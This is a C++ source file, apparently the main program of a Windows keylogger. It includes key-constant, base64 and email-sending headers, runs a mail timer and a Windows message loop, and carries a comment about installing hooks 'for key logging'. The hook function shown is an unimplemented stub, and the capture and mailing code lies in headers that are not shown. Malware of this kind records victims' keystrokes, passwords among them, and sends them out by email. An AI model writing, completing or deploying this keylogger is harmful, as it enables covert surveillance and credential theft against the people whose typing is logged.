#include <iostream>
#include <windows.h>
#include <curl/curl.h>

#include "helper.h"
#include "keyConstants.h"
#include "base64.h"
#include "timer.h"
#include "sendMail.h"

using namespace std;

// Function declarations
void Initialize();
void RunMessageLoop();
void Cleanup();
bool InstallHook();  // Placeholder for hook installation

// Global constants and variables
constexpr int EXIT_SUCCESS_CODE = 0;
constexpr int EXIT_FAILURE_CODE = 1;
Timer MailTimer;  // Ensure proper lifetime management for the Timer object

int main() {
    Initialize();
    RunMessageLoop();
    Cleanup();
    return EXIT_SUCCESS_CODE;
}

// Function to initialize the application
void Initialize() {
    try {
        // Create necessary directories
        if (!IO::MKDir(IO::GetOurPath(true))) {
            cerr << "Error: Failed to create necessary directories." << endl;
            exit(EXIT_FAILURE_CODE);  // Exit if directory creation fails
        }

        // Install hooks for key logging or other functionality
        if (!InstallHook()) {
            cerr << "Error: Failed to install hooks." << endl;
            exit(EXIT_FAILURE_CODE);  // Exit if hooks fail to install
        }
    } catch (const std::exception& e) {
        cerr << "Initialization error: " << e.what() << endl;
        exit(EXIT_FAILURE_CODE);  // Exit if any exception occurs
    }
}

// Function to run the message loop
void RunMessageLoop() {
    MSG Msg;
    // Process messages in a loop
    while (GetMessage(&Msg, NULL, 0, 0)) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);  // Process the message
    }
}

// Function for cleanup tasks
void Cleanup() {
    // Stop the mail timer when the message loop exits
    if (MailTimer.IsAlive()) {
        MailTimer.Stop();  // Ensure the timer is stopped properly
    }
    // Additional cleanup tasks can be added here if needed
}

// Placeholder function for hook installation (Implement accordingly)
bool InstallHook() {
    // TODO: Implement hook installation logic.
    // Returning true for now to allow the program to compile.
    return true;
}
